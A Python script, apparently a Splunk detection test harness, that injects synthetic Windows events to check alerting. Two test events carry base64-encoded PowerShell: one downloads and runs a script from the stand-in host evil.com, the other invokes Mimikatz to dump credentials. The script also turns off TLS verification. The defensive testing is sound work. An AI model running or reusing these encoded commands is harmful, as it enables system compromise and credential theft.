import os
import sys
import json
import urllib3
import splunklib.client as client
from datetime import datetime

# SILENCE SSL WARNINGS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIGURATION
SPLUNK_HOST = os.getenv('SPLUNK_HOST', 'localhost')
SPLUNK_PORT = int(os.getenv('SPLUNK_PORT', 8089))
SPLUNK_USERNAME = os.getenv('SPLUNK_USERNAME', 'admin')
SPLUNK_PASSWORD = os.getenv('SPLUNK_PASSWORD')

def create_test_events():
    """Returns a list of test scenarios: Malicious, Benign, and Excluded."""
    return [
        {
            "description": "Malicious - Encoded PowerShell Download (SHOULD ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAHAAcwAxACcAKQA=",
                "User": "victim_user",
                "Computer": "VICTIM-PC",
                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                "ProcessId": "0x1a2b"
            },
            "should_alert": True
        },
        {
            "description": "Benign - Normal Admin PowerShell (SHOULD NOT ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\Update_Inventory.ps1",
                "User": "it_admin",
                "Computer": "SERVER-01",
                "ParentProcessName": "C:\\Windows\\System32\\taskhostw.exe",
                "ProcessId": "0x09ef"
            },
            "should_alert": False
        },
        {
            "description": "Malicious - Mimikatz Execution (SHOULD ALERT)",
            "event": {
                "EventCode": "4688",
                "CommandLine": "powershell.exe -exec bypass -enc SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=",
                "User": "compromised_admin",
                "Computer": "ADMIN-PC",
                "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                "ProcessId": "0x2b3c"
            },
            "should_alert": True
        }
    ]

def inject_test_events(service):
    test_cases = create_test_events()
    
    # Ensure index exists
    index_name = "windows"
    if index_name not in service.indexes:
        service.indexes.create(index_name)
    index = service.indexes[index_name]

    print(f"\n🚀 Injecting {len(test_cases)} events into Splunk index: {index_name}...")
    
    for tc in test_cases:
        event_json = json.dumps(tc["event"])
        index.submit(event_json, sourcetype="WinEventLog:Security", source="dac_test_suite")
        status = "✅ [ALERT EXPECTED]" if tc["should_alert"] else "⚪ [BENIGN/IGNORE]"
        print(f"{status} {tc['description']}")

def main():
    if not SPLUNK_PASSWORD:
        print("❌ ERROR: SPLUNK_PASSWORD not set.")
        sys.exit(1)

    service = client.connect(host=SPLUNK_HOST, port=SPLUNK_PORT, username=SPLUNK_USERNAME, password=SPLUNK_PASSWORD, verify=False)
    inject_test_events(service)
    print("\n🎉 Ingestion complete. Data is ready for verification.")

if __name__ == "__main__":
    main()